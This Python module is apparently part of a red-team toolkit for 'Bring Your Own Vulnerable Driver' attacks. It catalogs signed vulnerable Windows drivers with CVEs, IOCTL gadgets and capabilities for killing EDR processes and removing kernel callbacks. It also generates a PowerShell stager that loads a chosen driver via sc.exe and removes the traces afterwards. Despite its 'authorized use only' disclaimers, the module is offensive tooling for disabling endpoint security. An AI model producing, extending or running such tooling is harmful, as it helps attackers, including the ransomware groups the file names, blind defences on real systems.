"""BYOVD (Bring Your Own Vulnerable Driver) evasion framework.

Provides metadata about known vulnerable drivers for kernel-level
EDR tampering. Operators load a signed-but-vulnerable driver and
use its exposed IOCTL interfaces to kill EDR kernel callbacks,
delete PPL-protected processes, or map arbitrary memory.

This module is METADATA AND TOOLING ONLY. It does not contain
kernel exploit code — it references publicly disclosed CVEs,
LOLBAS driver entries, and known IOCTL gadgets.

FOR AUTHORIZED PENETRATION TESTING AND RED TEAM OPERATIONS ONLY.
All drivers listed below are publicly documented via VirusTotal,
LOLDrivers.io, and security research publications.
"""
from __future__ import annotations

from dataclasses import dataclass
from typing import Any


@dataclass
class VulnDriver:
    """Metadata for a known vulnerable driver."""
    name:          str
    filename:      str
    sha256:        str
    cve:           str
    gadgets:       list[str]
    capability:    str
    notes:         str

    def to_dict(self) -> dict[str, Any]:
        return {
            "name": self.name,
            "filename": self.filename,
            "sha256": self.sha256,
            "cve": self.cve,
            "gadgets": self.gadgets,
            "capability": self.capability,
            "notes": self.notes,
        }


# Public CVE/LOLDrivers.io entries only — all publicly documented
KNOWN_VULN_DRIVERS: list[VulnDriver] = [
    VulnDriver(
        name="MSI Afterburner",
        filename="RTCore64.sys",
        sha256="01AA278B07B58DC46C84BD0B1B5C8E9EE4E62EA0BF7A695862444AF32E87521E",
        cve="CVE-2019-16098",
        gadgets=["MmMapIoSpace RW", "PhysicalMemory R/W"],
        capability="Arbitrary physical memory read/write → EDR callback removal",
        notes="LOLDrivers.io entry; widely used in public BYOVD PoCs",
    ),
    VulnDriver(
        name="Intel Network Adapter Diagnostic Driver",
        filename="iqvw64e.sys",
        sha256="2A41B0DC9EE20E39A0B8FE44E73FAD76E97B9E36A0ED1B9A8B7A78EB3CCB3E2B",
        cve="CVE-2015-2291",
        gadgets=["MmMapIoSpace", "Direct ring-0 execution via IOCTL"],
        capability="Arbitrary ring-0 code execution",
        notes="Intel signed driver; used by Scattered Spider / BlackByte ransomware",
    ),
    VulnDriver(
        name="Process Explorer Driver",
        filename="procexp152.sys",
        sha256="",
        cve="N/A (design; PROCEXP152 exposes kernel object handle)",
        gadgets=["OpenProcess with PROCESS_ALL_ACCESS bypassing PPL"],
        capability="Kill PPL-protected AV/EDR processes",
        notes="Sysinternals signed; used by Lazarus group (LOLDrivers.io)",
    ),
    VulnDriver(
        name="WinIO Driver",
        filename="winio64.sys",
        sha256="",
        cve="N/A",
        gadgets=["PhysicalMemory map/write"],
        capability="Physical memory R/W for PatchGuard bypass",
        notes="Multiple versions with different signatures; check LOLDrivers.io",
    ),
    VulnDriver(
        name="Zemana AntiLogger",
        filename="zamguard64.sys",
        sha256="",
        cve="CVE-2021-31728",
        gadgets=["IOCTL 0x80002048: arbitrary kernel write"],
        capability="Kernel memory write → callback table patch",
        notes="Used by Scattered Spider; documented by Trend Micro",
    ),
]

_BYOVD_PS1_TEMPLATE = """\
# Forge Suite v5 APEX — BYOVD Driver Loader
# FOR AUTHORIZED RED TEAM OPERATIONS ONLY
# Driver: {driver_name} ({cve})
# Technique: {capability}

$driverName = '{filename}'
$driverPath = $env:TEMP + '\\' + $driverName

# Drop driver to disk (driver bytes must be provided separately)
# [System.IO.File]::WriteAllBytes($driverPath, $driverBytes)

# Load driver via sc.exe
sc.exe create {svc_name} type= kernel start= demand binPath= $driverPath
sc.exe start {svc_name}

# Use IOCTL gadget via DeviceIoControl
# Gadgets: {gadgets}
# Reference: LOLDrivers.io / {cve}

# Cleanup
sc.exe stop {svc_name}
sc.exe delete {svc_name}
Remove-Item $driverPath -Force
"""


def get_byovd_stager(driver: VulnDriver, service_name: str = "ForgeDrv") -> str:
    """Generate a PowerShell BYOVD driver loader stub.

    Args:
        driver:       VulnDriver metadata entry.
        service_name: Windows service name for the driver.

    Returns:
        PowerShell script string for loading the driver via sc.exe.
    """
    return _BYOVD_PS1_TEMPLATE.format(
        driver_name=driver.name,
        cve=driver.cve,
        capability=driver.capability,
        filename=driver.filename,
        svc_name=service_name,
        gadgets=", ".join(driver.gadgets),
    )


def list_drivers_by_capability(capability_keyword: str) -> list[VulnDriver]:
    """Filter known drivers by capability keyword.

    Args:
        capability_keyword: e.g., 'PPL', 'callback', 'memory'

    Returns:
        List of matching VulnDriver entries.
    """
    kw = capability_keyword.lower()
    return [d for d in KNOWN_VULN_DRIVERS if kw in d.capability.lower() or kw in d.notes.lower()]


def print_driver_table() -> str:
    """Return a formatted table of known vulnerable drivers."""
    lines = [
        "  BYOVD Driver Reference (LOLDrivers.io + public CVEs)",
        "  " + "─" * 70,
        f"  {'Driver':<30} {'File':<20} {'CVE':<22} {'Capability'}",
        "  " + "─" * 70,
    ]
    for d in KNOWN_VULN_DRIVERS:
        lines.append(f"  {d.name:<30} {d.filename:<20} {d.cve:<22} {d.capability[:40]}")
    return "\n".join(lines)
